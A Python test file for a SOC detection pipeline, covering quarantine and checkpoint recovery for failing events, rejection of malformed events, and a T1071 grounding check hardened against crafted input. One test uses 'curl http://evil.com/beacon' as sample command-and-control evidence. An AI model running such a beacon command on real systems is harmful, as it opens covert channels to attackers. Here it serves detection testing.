"""
Fail-safe processing (2026-10-31).  Before, one event the pipeline failed on killed the live runner's thread: the
status still said "running" and the SOC silently stopped processing every later event.  And a long, crafted
command line made the T1071 grounding check backtrack for about a minute, on every pipeline run.

  - a malformed event (no host name, non-text fields, no addresses) is refused before it touches any state,
    counted and written to the quarantine file;
  - an event the pipeline fails on is quarantined, the stores and the loop are restored from the latest
    checkpoint, and the stream resumes without it: the result equals a run that never had that event;
  - the review API keeps the same case store object across the recovery;
  - the grounding check reads only what NCE was shown, so crafted text costs milliseconds.
"""
from __future__ import annotations

import json
import time
from datetime import datetime, timedelta, timezone

from dedale.environment import DEDALE_PROFILE, seed_store
from perception.host_detection import malformed_host_event
from perception.knowledge_db import graph_signature
from perception.nce_contract import NCEHypothesis
from perception.nce_engine import label_t1071_grounding
from perception.network_alert import malformed_network_alert
from perception.soc_loop import SocLoop
from soc_server.runner import LiveRunner, stream_after

START = datetime(2024, 12, 30, tzinfo=timezone.utc)
TRAIN_END = datetime(2025, 1, 6, tzinfo=timezone.utc)
END = START + timedelta(days=11)


def _events(skip: set[int] = frozenset()):
    out, rid = [], 0
    for day in range(10):                             # 6 training days, 4 test days
        for hour in (9, 13, 17):
            t = START + timedelta(days=day, hours=hour)
            novel = f"C:\\x\\new{day}.exe" if t >= TRAIN_END else f"C:\\x\\tool{(day * 3 + hour) % 7}.exe"
            for image in ("C:\\x\\word.exe", novel):
                rid += 1
                if rid not in skip:
                    out.append((t, {"t": t.isoformat().replace("+00:00", "Z"), "host": "CLIENT2", "rid": rid,
                                    "ch": "sysmon", "code": 1, "image": image, "parent_image": "C:\\Windows\\explorer.exe",
                                    "cmd": "x", "user": "BREACH\\client2"}))
    return out


class _Src:
    def __init__(self, events):
        self.list = events

    def events(self, after):
        return stream_after(self.list, after)


POISON = 50                                           # a test-window event (day 8, 2025-01-07)


def _handle(fail_on: set[int]):
    def handle(loop, ev, at):
        if ev.get("rid") in fail_on:
            raise RuntimeError("a bug this event triggers")
        loop.process_host_event(ev, at)
    return handle


def _runner(home, events, fail_on=frozenset()):
    return LiveRunner(home, _Src(events), profile=DEDALE_PROFILE, start=START,
                      make_loop=lambda db, cs: SocLoop(db, mode="gated", training_end=TRAIN_END, case_store=cs),
                      handle=_handle(set(fail_on)), seed=lambda db: seed_store(db, START))


def _snapshot(r):
    return (graph_signature(r.db.graph.graph),
            [(c["case_id"], c["title"], c["review_status"], c["alert_count"]) for c in r.cases.cases()])


def _expected(tmp_path, skip):
    clean = _runner(tmp_path / "clean", _events(skip))
    clean.run_until(END)
    snap = _snapshot(clean)
    clean.stop()
    return snap


def test_a_failing_event_is_quarantined_and_the_rest_equals_a_run_without_it(tmp_path):
    expected = _expected(tmp_path, {POISON})
    r = _runner(tmp_path / "p", _events(), fail_on={POISON})
    r.run_until(TRAIN_END + timedelta(hours=1))                  # a checkpoint before the poisoned event
    assert r.status()["events_failed"] == 0 and r.last_checkpoint is not None
    store = r.cases
    r.run_until(END)                                             # fails on it, recovers from the checkpoint
    assert r.status()["events_failed"] == 1 and r.cases is store # the API's case store object is kept
    assert _snapshot(r) == expected
    rec = [json.loads(line) for line in (tmp_path / "p" / "quarantine.jsonl").read_text(encoding="utf-8").splitlines()]
    assert [(q["kind"], q["event"]["rid"]) for q in rec] == [("failed", POISON)]
    assert "a bug this event triggers" in rec[0]["error"] and "Traceback" in rec[0]["traceback"]
    r.stop()
    again = _runner(tmp_path / "p", _events(), fail_on={POISON})  # a restart still skips it
    assert again.restored and again.status()["events_failed"] == 1
    again.stop()


def test_a_failure_before_the_first_checkpoint_starts_over_without_the_event(tmp_path):
    expected = _expected(tmp_path, {5})
    r = _runner(tmp_path / "f", _events(), fail_on={5})          # training window, nothing checkpointed yet
    r.run_until(END)
    assert r.status()["events_failed"] == 1 and _snapshot(r) == expected
    r.stop()


def test_malformed_events_are_refused_counted_and_kept(tmp_path):
    events = _events()
    t = TRAIN_END + timedelta(hours=2)
    bad = [(t, {"t": "x", "host": None, "rid": 999, "ch": "sysmon", "code": 1, "image": "C:\\evil.exe"}),
           (t, {"t": "x", "host": "CLIENT2", "rid": 998, "ch": "sysmon", "code": 1, "image": ["C:\\evil.exe"]})]
    i = next(k for k, (at, _) in enumerate(events) if at > t)
    r = _runner(tmp_path / "m", events[:i] + bad + events[i:])
    r.run_until(END)
    assert r.status()["events_rejected"] == 2 and r.status()["events_failed"] == 0
    assert _snapshot(r) == _expected(tmp_path, set())            # nothing else changed
    rec = [json.loads(line) for line in (tmp_path / "m" / "quarantine.jsonl").read_text(encoding="utf-8").splitlines()]
    assert sorted(q["error"] for q in rec) == ["field 'image' is not text", "no host name"]
    r.stop()


def test_a_failing_command_is_recorded_as_failed_and_the_loop_goes_on(tmp_path):
    r = _runner(tmp_path / "c", _events())
    r.run_until(TRAIN_END + timedelta(hours=10))
    (case,) = [c for c in r.cases.cases() if c["review_status"] == "open"][:1]
    with r.cases.batch():                                        # a command the loop cannot apply (a bug's shape)
        r.cases._con.execute("INSERT INTO commands (kind, case_id, action_id, actor, at) VALUES (?, ?, ?, ?, ?)",
                             ("execute", case["case_id"], "no-such-action", "analyst:alice",
                              r.now().isoformat().replace("+00:00", "Z")))
    r.cases.submit_verdict(case["case_id"], "benign", "alice", r.now())
    r.run_until(END)                                             # before: the exception stopped the runner
    cmds = r.cases.commands()
    assert all(c["applied_at"] for c in cmds) and len(cmds) == 2
    failed = [c for c in cmds if c["kind"] == "execute"][0]
    assert failed["result"]["applied"] is False and "TypeError" in failed["result"]["error"]
    verdict = [c for c in cmds if c["kind"] == "verdict"][0]
    assert verdict["result"].get("applied", True) is not False   # the next command was applied
    r.stop()


def test_the_checks():
    assert malformed_host_event({"host": "CLIENT1", "image": "a.exe", "cmd": "x"}) is None
    assert malformed_host_event({"host": " ", "image": "a.exe"}) == "no host name"
    assert malformed_host_event({"host": "CLIENT1", "cmd": 5}) == "field 'cmd' is not text"
    assert malformed_host_event("text") == "not an object"
    assert malformed_network_alert({"src_ip": "172.16.1.3", "dst_ip": "172.19.0.2"}) is None
    assert malformed_network_alert({"src_ip": "172.16.1.3"}) == "no dst_ip"


def test_crafted_text_cannot_stall_the_grounding_check():
    t1071 = [NCEHypothesis(technique_id="T1071", source_account="", source_host="CLIENT1", target_host="x",
                           nce_confidence=0.5, supporting_evidence_refs=["command_line"])]
    for text in ("ab-c." * 8000, "a." * 16000, "a-" * 16000):      # each took 6-62 s before
        t0 = time.perf_counter()
        label_t1071_grounding(t1071, {"command_line": text, "raw_log_line": text, "script": text})
        assert time.perf_counter() - t0 < 1.0
    shown = "x" * 600 + " curl http://evil.com/beacon"            # past what NCE was shown: not evidence
    assert label_t1071_grounding(t1071, {"command_line": shown})[0].evidence_grounding == "ungrounded"
    assert label_t1071_grounding(t1071, {"command_line": "curl http://evil.com/beacon"})[0].evidence_grounding \
        == "grounded"
